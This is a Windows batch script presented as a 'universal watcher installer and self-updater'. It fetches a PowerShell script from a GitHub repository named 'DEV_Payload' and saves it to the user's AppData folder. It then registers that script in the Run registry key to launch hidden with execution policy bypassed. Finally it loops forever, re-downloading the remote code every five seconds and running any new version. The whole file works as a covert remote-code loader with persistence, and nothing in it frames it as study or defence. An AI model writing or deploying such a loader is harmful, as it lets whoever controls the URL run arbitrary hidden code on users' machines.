@echo off
:: ===============================================
:: UNIVERSAL WATCHER INSTALLER + SELF-UPDATER
:: ===============================================

:: Define variables
set "BOOTSTRAP=%APPDATA%\UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1"
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1?nocache=%random%"
set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=UniversalWatcherPS1"

:: First-time setup: download latest script
echo [INFO] Downloading latest script to "%BOOTSTRAP%"...
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Bootstrapper'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "Set-Content -Path '%BOOTSTRAP%' -Value $remote"

:: Register autorun key
echo [INFO] Registering autorun key...
reg add "%REG_PATH%" /v "%REG_NAME%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f

:: Main loop: check every 5 seconds
:loop
:: Download latest GitHub content into temp file
set "TMPFILE=%TEMP%\temp_watcher.ps1"
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Updater'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "Set-Content -Path '%TMPFILE%' -Value $remote"

:: Read content of TMPFILE
setlocal EnableDelayedExpansion
set "CONTENT_REMOTE="
for /f "usebackq delims=" %%A in ("%TMPFILE%") do (
    set "line=%%A"
    set "CONTENT_REMOTE=!CONTENT_REMOTE!!line!"
)

:: Read content of BOOTSTRAP
set "CONTENT_LOCAL="
for /f "usebackq delims=" %%A in ("%BOOTSTRAP%") do (
    set "line=%%A"
    set "CONTENT_LOCAL=!CONTENT_LOCAL!!line!"
)

:: Compare contents
if "!CONTENT_REMOTE!"=="!CONTENT_LOCAL!" (
    echo [INFO] No changes detected. Running local script...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
) else (
    echo [INFO] Detected change in remote script. Refreshing local copy and autorun key...

    del /f /q "%BOOTSTRAP%"
    reg delete "%REG_PATH%" /v "%REG_NAME%" /f

    copy /y "%TMPFILE%" "%BOOTSTRAP%"

    reg add "%REG_PATH%" /v "%REG_NAME%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f

    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
)

:: Clean up temp file
del /f /q "%TMPFILE%"

:: Wait before next check
timeout /t 5 >nul
goto loop
